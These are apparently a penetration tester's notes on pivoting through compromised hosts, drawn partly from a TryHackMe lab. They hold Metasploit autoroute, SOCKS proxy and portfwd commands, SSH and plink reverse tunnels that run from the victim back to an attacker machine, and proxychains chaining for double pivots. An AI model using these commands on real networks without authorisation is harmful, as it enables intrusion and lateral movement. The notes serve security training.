> This section is a collection of pivoting techniques. Mainly commands with the metasploit framework

Through pivoting it is possible to scan/enumerate/exploit targets in a new subnet or behind a firewall/DMZ from a bastion host (host acts as some kind of proxy).

Types
- `Tunneling`  and/or `Proxying`:  Pipe all the traffic over intermediary hosts, more versatile but less stable/hidden
- `Port Forwarding`: Forward one specific port over an intermediary host to get deeper into the network stable and hidden, but usually only a specific port

## Enable pivoting through an established meterpreter session

### 0. Prerequisites

- established meterpreter session on a host
- Victim host must have connection to other NW or machine

### 1. Create a route into another network

```bash
msf> use post/multi/manage/autoroute
msf> set SESSION 1  # session on bastion host
msf> set SUBNET 10.10.10.0  # target network
msf> set NETMASK /16  # if different from /24
msf> run

# OR

meterpreter> run autoroute -s 10.10.10.0/16 # inside the correct session!
```

Routes can be display with the `route` command in the console.

Also they can be added 'manually':

```bash
msf> route add <networkIP> <subnetMask> <sessionNumber>
msf> route add <networkIP>/24 <sessionsNumber>
```

### 2. Using the Pivot within metasploit frameowrk

This should be working already. If traffic is to go to the network covered by the defined route, metasploit will handly it automatically.

### 3. Start the `SOCKS` proxy for outside tools to pivot

```bash
msf> use auxiliary/server/socks_proxy
msf> set VERSION 4a  # optionally version 5 works also
msf> run
```

Socks proxy is started as a job in metasploit and runs in the background (check via `jobs` command).

- Also check if local config for proxychains matches the `PORT` and `VERSION` parameter stated within metasploit.

```bash
sudo nano /etc/proxychains4.conf  # or similar config name
> version 4a  # if using version 4
> port 1080
```

With this config and metasploit running the socks server, we can use `proxychains` in order to use other tools over this tunnel.

### 4. Use `proxychains` with `nmap`

> Remember: `SOCKS` is a service on the upper layers of the OSI model - `ICMP` and other low-level functions will not work with proxychains!

```bash
# scan ftp port with nmap
sudo proxychains nmap -Pn -sTV -n -p21 <targetIP>

# scan top 50 (most common) ports with nmap
sudo proxychains nmap -sT -Pn -n <targetIP> --top-ports 50
```

## Portforwarding

> This is crucial if we want to reach another machine not capable of reaching the web or the IP-Range where the attacker resides!
> 
> Using metasploit

```bash
meterpreter> portfwd add -l <localPort> -r <targetIP> -p <targetPort>
meterpreter> portfwd add -l 3333 -r 10.0.0.15 -p 3389
```

Example above: `RDP` connect to local port 3333 will actually goto 10.0.0.15:3389

![[m6_portforward.png]]

Listener on attacker machine forwarding traffic to the target over the compromised host. Requires an already exploited victim to use as intermediary.

**IMPORTANT:**
This procedure is possible on linux and windows - BUT it will block the port on the attacker machine (so  you can jump from your local 3333 to the remote target machine 3389):

```bash
netstat -tulpn

Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:3333            0.0.0.0:*               LISTEN      54056/ruby          
```

## Forward connections (with SSH)
> Taken from the `wreath-network` on tryhackme with LotL-tools

Port Forwarding

```bash
ssh -L <localPort>:<IP-hostB>:<Port-hostB> userA@<IP-HostA> -fN # -fn background the shell
ssh -L 3333:10.10.10.5:3389 user@10.10.10.15 -fN # according to below image
```

Proxying

```bash
ssh -D <localPort> userB@<hostB> -fN # pipe all traffic via a given port over hostB
ssh -D 9050 user@10.10.10.15 -fN # according to below image
```

## REVERSE portforwarding

> So the target machine has a route back over the exploited machine

```bash
# meterpreter on the exploited machine 10.10.10.15
meterpreter> portfwd add -l <attackerPort> -L <attackerIP> -p <exploitedMachinePort> -R  # -R indicating reverse portfwd
```

### For Windows

> Using meterpreter (again) -> routes to the remote NW should already exist

```bash
msf> use post/windows/manage/portproxy
msf> set connect_port 3333 <attackerPort>
msf> set connect_address <attackerIP>
msf> set local_address <exploitedMachine> # 10.10.10.15 in above img
msf> set local_port <exploitMachinePort> # 3333 or 3389 as seen above
msf> set session 1 # meterpreter session playing the proxy
```

Traffice is piped over the exploited machine from the target machine to the attacker!

## Reverse connections (with SSH)
> Again taken from the `wreath-network` on tryhackme

Connect from the remote machine onto your attacker machine.

```bash
# create a key on the remote system
ssh-keygen

# write the key into your attacker machine authorized_keys like this
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty ssh-rsa AAA....zxae= kali@kali

# check your local ssh is up and running
sudo systemctl status ssh
```

Push your newly created *temporary* private key onto the remote machine and establish a reverse portforwarding:

```bash
ssh -R <localport>:<targetIP>:<targetPort> username@kali -i <keyfile> -fN
ssh -R 8000:10.10.10.5:3389 kali@kali -i tempkey -fN # executed on 10.10.10.15 - according to above image!
```

Reverse proxy on new ssh clients

```bash
ssh -R 1337 kali@kali -i tempkey -fN # pipe all traffice on 1337 on kali into the remote network
```

### Followup

> You can address an exploited machine as receiving end of an exploit -> but only if there is already meterpreter running on it and the traffic is forwarded to the attacker

For ease of use we can create a payload with msfvenom pointing to the exploited machine (which forwards the traffic on the specific port to the attacker IP) -> upload (this port must also be forwarded) and execute on the new target to get a connect-back in metasploit.

## Double pivoting
> Or how to chain proxychains to reach an even deeper network

[SOURCE](https://pentest.blog/explore-hidden-networks-with-double-pivoting/)

1. Create corresponding routes for the networks via the exploited machines -> [[Pivoting#1. Create a route into another network]]
2. For every route start a `socks_proxy` job in metasploit [[Pivoting#3. Start the `SOCKS` proxy for outside tools to pivot]]
3. Adjust the configuration so `proxychains` is able to chain the different connections together to pivot into the deep network
```bash
# nano /etc/proxychains4.conf
dynamic_chain # enable
# strict_chain # disable
proxy_dns # optional
tcp_read_time_out 15000 # optional
tcp_connect_time_out 8000 # optional
socks5  127.0.0.1 1080 # Pivot 1
socks5  127.0.0.1 1081 # Pivot 2
```

Why should it work?
-> If we utilize Metasploit and add the correct routing table entries for the deep network the metasploit internal socks_proxy will pipe the traffic through the intermediate exploited hosts:
*This module provides a SOCKS proxy server that uses the builtin Metasploit routing to relay connections.*


## Other specifics on windows
> In case ssh is not running

Push the `plink.exe` from [putty](https://www.putty.org/) onto the owned machine, in order to create a ***REVERSE CONNECTION*** do as follows on the intermediate host:

```bash
cmd.exe /c echo y | .\plink.exe -R <kaliPort>:<targetIP>:<targetPort> kali@kali -i <keyfile> -N

# for the image above:
cmd.exe /c echo y | .\plink.exe -R 8000:10.10.10.5:3389 kali@kaliIP -i keyfile -N
```

`10.10.10.5` is the host *deep* in the network...

### create ssh keys working on windows
> on linux generated keys may not properly work on windows, therefore we avert this behaviour and do it windows style.

It's a conversion - so we still need the `ssh-keygen` generated keys!

```bash
ssh-keygen
sudo apt install putty-tools
puttygen id_rsa -o windowskey.ppk
```